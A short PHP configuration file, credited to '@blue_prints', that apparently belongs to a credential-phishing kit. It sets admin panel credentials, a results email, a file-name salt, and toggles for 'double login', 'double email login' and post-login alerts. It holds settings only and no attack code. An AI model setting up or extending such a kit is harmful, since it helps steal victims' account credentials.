<?php

// ------------------------------------------------- //
  #                 BY: @blue_prints              #
  #             F#ck you credit changer :)        #
  # Change credit if you dont know how to code :) #
  #################################################
// -------------------------------------------------//

//admin pannel
$username = "ad";
$password = "ad";

//important details
$email = ""; // your email
$salt = "4582dd12"; // File name

//important on/off
$d_log = "on"; // double login
$e_log = "on"; // double email login
$alert = "on";  //alert after login


?>